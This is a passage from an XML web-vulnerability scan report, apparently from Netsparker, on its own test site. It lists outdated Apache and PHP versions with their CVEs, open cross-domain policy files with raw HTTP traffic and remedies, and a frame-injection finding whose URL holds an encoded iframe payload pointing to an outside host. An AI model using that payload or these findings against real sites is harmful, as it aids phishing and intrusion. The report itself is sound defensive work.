									<title>Apache &#39;mod_isapi&#39; Memory Corruption Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2010-0434</references>
									<affectedversions>2.2.0 to 2.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache mod_proxy_ajp Module Incoming Request Body Denial Of Service Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2010-0408</references>
									<affectedversions>2.2.0 to 2.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache mod_cache and mod_dav Request Handling Denial of Service Vulnerability </title>
									<severity>Medium</severity>
									<references>CVE-2010-1452</references>
									<affectedversions>2.2.0 to 2.2.15</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache APR-util apr_brigade_split_line() Denial of Service Vulnerability </title>
									<severity>Low</severity>
									<references>CVE-2010-1623</references>
									<affectedversions>2.2.0 to 2.2.16</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache APR apr_fnmatch() Denial of Service Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2011-0419</references>
									<affectedversions>2.2.0 to 2.2.17</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache HTTP Server CVE-2011-3192 Denial Of Service Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2011-3192</references>
									<affectedversions>2.2.0 to 2.2.19</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache HTTP Server &#39;mod_proxy&#39; Reverse Proxy Information Disclosure Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-3368</references>
									<affectedversions>2.2.0 to 2.2.21</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache HTTP Server Scoreboard Local Security Bypass Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2012-0031</references>
									<affectedversions>1.3.35 to 2.2.21</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache HTTP Server &#39;mod_proxy&#39; Reverse Proxy Information Disclosure Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-4317</references>
									<affectedversions>2.2.0 to 2.2.21</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache HTTP Server &#39;mod_proxy&#39; Reverse Proxy Information Disclosure Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-3639</references>
									<affectedversions>2.2.0 to 2.2.9</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache HTTP Server CVE-2011-3348 Denial Of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-3348</references>
									<affectedversions>2.0 to 2.2.20</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache Multiple XSS Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2012-4558</references>
									<affectedversions>2.2.0 to 2.4.3</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache Code Execution Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2013-1862</references>
									<affectedversions>2.2.0 to 2.2.24</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache Denial of Service Vulnerabillity</title>
									<severity>Low</severity>
									<references>CVE-2013-1896</references>
									<affectedversions>2.2.2 to 2.2.21</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache &#39;main/util.c&#39; Denial of Service Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2013-6438</references>
									<affectedversions>2.0 to 2.4.7</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>Apache &#39;mod_log_config.c&#39; Denial of Service Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2014-0098</references>
									<affectedversions>2.0 to 2.4.7</affectedversions>
								</knownvulnerability>
						</knownvulnerabilities>
				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/</url>
					<type>PhpOutOfDate</type>
					<severity>High</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified you are using an out-of-date version of PHP.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;Since this is an old version of the software, it may be vulnerable to attacks.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Please upgrade your installation of PHP to the latest stable version.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://php.net/downloads.php&#39;&gt;Downloading PHP&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
&lt;span class=&quot;highlight&quot;&gt;Server: Apache/2.2.8 (Win32) PHP/5.2.6
&lt;/span&gt;
X-Powered-By: PHP/5.2.6
Content-Length: 144
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:14 GMT

&lt;html&gt;
&lt;HEAD&gt;
&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
&lt;!--
window.location=&quot;process.php?file=Generics/index.nsp&quot;;
//--&gt;
&lt;/SCRIPT&gt;
&lt;/HEAD&gt;
&lt;/html&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Identified Version">&lt;![CDATA[5.2.6]]&gt;</info>
							<info name="Latest Version">&lt;![CDATA[7.2.7]]&gt;</info>
							<info name="Vulnerability Database">&lt;![CDATA[Result is based on 2018-06-28 vulnerability database content.]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A9</OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC>310</CAPEC>
							<PCI31>6.2</PCI31>
							<PCI32>6.2</PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C1</OWASPPC>

						</classification>

						<knownvulnerabilities>
								<knownvulnerability>
									<title>PHP &#39;chdir()&#39; and &#39;ftok()&#39; &#39;safe_mode&#39; Multiple Security Bypass Vulnerabilities</title>
									<severity>Medium</severity>
									<references>CVE-2008-2666</references>
									<affectedversions>5.0.0 to 5.2.6</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;imageRotate()&#39; Uninitialized Memory Information Disclosure Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2008-5498</references>
									<affectedversions>5.0.0 to 5.2.8</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP SAPI &#39;php_getuid()&#39; Safe Mode Restriction-Bypass Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2008-5624</references>
									<affectedversions>5.0.0 to 5.2.6</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;mbstring&#39; Extension Buffer Overflow Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2008-5557</references>
									<affectedversions>5.0.0 to 5.2.6</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;php/ext/xml/xml.c&#39; Integer Overflow Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2009-5016</references>
									<affectedversions>5.0.0 to 5.2.10</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;php_filter_validate_email()&#39; Function Denial of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2010-3710</references>
									<affectedversions>5.2.0 to 5.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;xml_utf8_decode()&#39; UTF-8 Input Validation Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2010-3870</references>
									<affectedversions>5.0.0 to 5.3.4</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Calendar Extension &#39;SdnToJulian()&#39; Integer Overflow Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-1466</references>
									<affectedversions>5.0.0 to 5.3.5</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;steam.c&#39; and &#39;dirstream.c&#39; Multiple Format String Vulnerabilities</title>
									<severity>Medium</severity>
									<references>CVE-2010-2094, CVE-2010-2950</references>
									<affectedversions>5.0.0 to 5.3.3</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;substr_replace()&#39; Function Memory Corruption Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2011-1148</references>
									<affectedversions>5.0.0 to 5.3.6</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP libzip &#39;_zip_name_locate()&#39; NULL Pointer Dereference Denial Of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-0421</references>
									<affectedversions>5.0.0 to 5.3.5</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;phar/phar_object.c&#39; Format String Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2011-1153</references>
									<affectedversions>5.0.0 to 5.3.5</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;shmop_read()&#39; Remote Integer Overflow Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2011-1092</references>
									<affectedversions>5.0.0 to 5.3.5</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Stream Component Remote Denial of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-1469</references>
									<affectedversions>5.0.0 to 5.3.5</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;Zip&#39; Extension &#39;zip_fread()&#39; Function Denial of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-1471</references>
									<affectedversions>5.0.0 to 5.3.6</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;OpenSSL&#39; Extension Multiple Denial of Service Vulnerabilities</title>
									<severity>High</severity>
									<references>CVE-2011-1468</references>
									<affectedversions>5.0.0 to 5.3.5</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Versions Prior to 5.3.7 Multiple Security Vulnerabilities</title>
									<severity>Medium</severity>
									<references>CVE-2011-2202</references>
									<affectedversions>5.0.0 to 5.3.6</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;ZipArchive::addGlob&#39; and &#39;ZipArchive::addPattern&#39; Denial Of Service Vulnerabilities</title>
									<severity>High</severity>
									<references>CVE-2011-1657</references>
									<affectedversions>5.0.0 to 5.3.6</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;proc_open()&#39; &#39;safe_mode_protected_env_var&#39; Restriction-Bypass Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2009-4018</references>
									<affectedversions>5.0.0 to 5.2.10</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;SplObjectStorage&#39; Unserializer Arbitrary Code Execution Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2010-2225</references>
									<affectedversions>5.2.0 to 5.2.13</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;ext/imap/php_imap.c&#39;  Use After Free Denial of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2010-4150</references>
									<affectedversions>5.2.0 to 5.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP ZipArchive::getArchiveComment() NULL Pointer Dereference Denial Of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2010-3709</references>
									<affectedversions>5.2.0 to 5.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;zend_strtod()&#39; Function Floating-Point Value Denial of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2010-4645</references>
									<affectedversions>5.2.0 to 5.2.16</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Multiple NULL Pointer Dereference Denial Of Service Vulnerabilities</title>
									<severity>High</severity>
									<references>CVE-2011-3182</references>
									<affectedversions>5.0.0 to 5.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;crypt&#39; Function Buffer Overflow Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2011-3268</references>
									<affectedversions>5.0.0 to 5.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;error_log&#39; Function Denial of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-3267</references>
									<affectedversions>5.0.0 to 5.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;var_export&#39; Function Remote Information Disclosure Vulnerability </title>
									<severity>High</severity>
									<references>CVE-2010-2531</references>
									<affectedversions>5.2.0 to 5.2.13</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;strrchr&#39; Function Information Disclosure Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2010-2484</references>
									<affectedversions>5.2.0 to 5.2.13</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;fnmatch&#39; Function Stack Consumption Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2010-1917</references>
									<affectedversions>5.2.0 to 5.2.13</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Zend Engine Use-after-free Heap Corruption Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2010-4697</references>
									<affectedversions>5.2.0 to 5.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP GD Extension &#39;imagepstext()&#39; Function Stack Buffer Overflow Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2010-4698</references>
									<affectedversions>5.2.0 to 5.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;EXTR_OVERWRITE&#39; Security Bypass Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-0752</references>
									<affectedversions>5.2.0 to 5.2.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;mt_rand&#39; Function Integer Overflow Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2011-0755</references>
									<affectedversions>5.0.1 to 5.3.3</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;iconv&#39; Module &#39;iconv_mime_decode_headers()&#39; Function Security-Bypass Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2010-4699</references>
									<affectedversions>5.0.0 to 5.3.3</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP LCG Entropy Security Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2010-1128</references>
									<affectedversions>5.2.0 to 5.2.12</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;session_save_path()&#39; safe_mode Restriction Bypass Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2010-1130</references>
									<affectedversions>5.0.0 to 5.2.12</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;sqlite_single_query()&#39; and &#39;sqlite_array_query()&#39; Arbitrary Code Execution Vulnerabilities</title>
									<severity>Low</severity>
									<references>CVE-2010-1868</references>
									<affectedversions>5.2.0 to 5.2.13</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;tempnam()&#39; &#39;safe_mode&#39; Validation Restriction-Bypass Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2010-1129</references>
									<affectedversions>5.2.0 to 5.2.12</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Unrestricted Temporary File Creation Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2009-4017</references>
									<affectedversions>5.2.0 to 5.2.11</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;posix_mkfifo()&#39; &#39;open_basedir&#39; Bypass Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2009-3558</references>
									<affectedversions>5.0.0 to 5.2.12</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;ini_restore()&#39; Memory Information Disclosure Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2009-2626</references>
									<affectedversions>5.0.0 to 5.2.10</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Web Form Hash Collision Denial Of Service Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2011-4885</references>
									<affectedversions>5.0.0 to 5.3.8</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;phar_parse_tarfile&#39; Integer Overflow Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2012-2386</references>
									<affectedversions>4.0.0 to 5.4.1</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;_php_stream_scandir&#39; Overflow Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2012-2688</references>
									<affectedversions>4.0.0 to 5.4.4</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;com_print_typeinfo&#39; Buffer Overflow Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2012-2376</references>
									<affectedversions>3.0.0 to 5.4.3</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;php-cgi&#39; Command Line Argument Injection Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2012-2311</references>
									<affectedversions>3.0.0 to 5.4.1</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP File Upload Denial of Service Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2012-1172</references>
									<affectedversions>5.0.0 to 5.3.9</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;magic_quotes_gpc&#39; Bypass Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2012-0831</references>
									<affectedversions>3.0.0 to 5.3.9</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Multiple Remote Vulnerabilities</title>
									<severity>High</severity>
									<references>CVE-2013-1635</references>
									<affectedversions>3.0.0 to 5.4.12</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Multiple Remote Vulnerabilities in SOAP Parser</title>
									<severity>Low</severity>
									<references>CVE-2013-1643</references>
									<affectedversions>3.0.0 to 5.4.12</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Heap Based Buffer Overflow Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2013-2110</references>
									<affectedversions>3.0.0 to 5.4.15</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Integer Overflow and Denial of Service Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2013-4635</references>
									<affectedversions>3.0.0 to 5.4.15</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP &#39;gdxpm.c&#39; Denial of Service Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2014-2497</references>
									<affectedversions>5.0.0 to 5.4.26</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP-CGI Remote Code Execution Vulnerability</title>
									<severity>Low</severity>
									<references>CVE-2012-1823</references>
									<affectedversions>5.0.0 to 5.4.1</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Improper Link Resolution Before File Access</title>
									<severity>Medium</severity>
									<references>CVE-2014-5459</references>
									<affectedversions>3.0.0 to 5.6.0</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Stack Based Buffer Overflow Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2014-8626</references>
									<affectedversions>5.2.0 to 5.2.6</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Code Execution Vulnerability</title>
									<severity>High</severity>
									<references>CVE-2014-9427</references>
									<affectedversions>3.0.0 to 5.6.4</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Privilege Escalation Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2015-8994</references>
									<affectedversions>5.0.0 to 7.0.14</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Denial of Service Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2016-7478</references>
									<affectedversions>5.0.0 to 7.0.12</affectedversions>
								</knownvulnerability>
								<knownvulnerability>
									<title>PHP Information Disclosure Vulnerability</title>
									<severity>Medium</severity>
									<references>CVE-2017-16642</references>
									<affectedversions>3.0.0 to 7.1.6</affectedversions>
								</knownvulnerability>
						</knownvulnerabilities>
				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/crossdomain.xml</url>
					<type>OpenCrossDomainXml</type>
					<severity>Medium</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected an open policy &lt;code&gt;Crossdomain.xml&lt;/code&gt; file.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;Open policy Crossdomain.xml file allows other SWF files to make HTTP requests to your web server and see its response. This can be used for accessing one time tokens and CSRF nonces to bypass CSRF restrictions.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Configure your Crossdomain.xml to prevent access from everywhere to your domain.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.adobe.com/devnet/flashplayer/articles/cross_domain_policy.html&#39;&gt;Cross-domain policy file usage recommendations for Flash Player&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://blog.jeremiahgrossman.com/2008/05/crossdomainxml-invites-cross-site.html&#39;&gt;Crossdomain.xml invites Cross-site Mayhem&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /crossdomain.xml HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
Content-Length: 315
Last-Modified: Sat, 01 Jan 2011 17:33:20 GMT
Accept-Ranges: bytes
Content-Type: application/xml
X-Pad: avoid browser bug
Date: Fri, 29 Jun 2018 03:09:19 GMT
ETag: &quot;30000000199e4-13b-498cc50ab1d37&quot;

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;span class=&quot;highlight&quot;&gt;&lt;cross-domain-policy&lt;/span&gt; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:noNamespaceSchemaLocation=&quot;http://www.adobe.com/xml/schemas/PolicyFile.xsd&quot;&gt;
  &lt;allow-access-from domain=&quot;*&quot; /&gt;
	&lt;site-control permitted-cross-domain-policies=&quot;master-only&quot;/&gt;
&lt;/cross-domain-policy&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Policy Rules">&lt;![CDATA[&lt;allow-access-from domain=&quot;*&quot; /&gt;]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>15</WASC>
							<CWE>16</CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:H/RL:O/RC:C</vector>

									<score>
										<type>Base</type>
										<value>6.5</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>6.2</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>6.2</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/clientaccesspolicy.xml</url>
					<type>OpenClientAccessPolicy</type>
					<severity>Medium</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected an open Silverlight client access policy file (&lt;code&gt;ClientAccessPolicy.xml&lt;/code&gt;).&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;The ClientAccessPolicy.xml file allows other Silverlight client services to make HTTP requests to your web server and see its response. This might be used for accessing one time tokens and CSRF nonces to bypass CSRF restrictions.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Configure your ClientAccessPolicy.xml file to prevent access from everywhere outside your domain.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/cc197955(VS.95).aspx&#39;&gt;Making a Service Available Across Domain Boundaries&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/cc645032(VS.95).aspx&#39;&gt;Network Security Access Restrictions in Silverlight&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /clientaccesspolicy.xml HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
Content-Length: 280
Last-Modified: Sun, 02 Jan 2011 17:09:33 GMT
Accept-Ranges: bytes
Content-Type: application/xml
X-Pad: avoid browser bug
Date: Fri, 29 Jun 2018 03:09:20 GMT
ETag: &quot;30000000199e2-118-498e0196a2efd&quot;

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;access-policy&gt;
	&lt;span class=&quot;highlight&quot;&gt;&lt;cross-domain-access&lt;/span&gt;&gt;
		&lt;allow-from http-request-headers=&quot;*&quot;&gt;
			&lt;domain uri=&quot;*&quot;/&gt;
		&lt;/allow-from&gt;
		&lt;grant-to&gt;
			&lt;resource path=&quot;/&quot; include-subpaths=&quot;true&quot;/&gt;
		&lt;/grant-to&gt;
	&lt;/cross-domain-access&gt;
&lt;/access-policy&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Policy Rules">&lt;![CDATA[*]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>15</WASC>
							<CWE>16</CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:H/RL:O/RC:C</vector>

									<score>
										<type>Base</type>
										<value>6.5</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>6.2</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>6.2</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/hello.php?name=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e</url>
					<type>FrameInjection</type>
					<severity>Medium</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected frame injection, which occurs when a frame on a vulnerable web page displays another web page via a user-controllable input.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;An attacker might use this vulnerability to redirect users to other malicious websites that are used for phishing and similar attacks.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;Where possible do not use users&#39; input for URLs.&lt;/li&gt;&lt;li&gt;If you definitely need dynamic URLs, make a list of valid accepted URLs and do not accept other URLs.&lt;/li&gt;&lt;li&gt;Ensure that you only accept URLs which are located on accepted domains.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
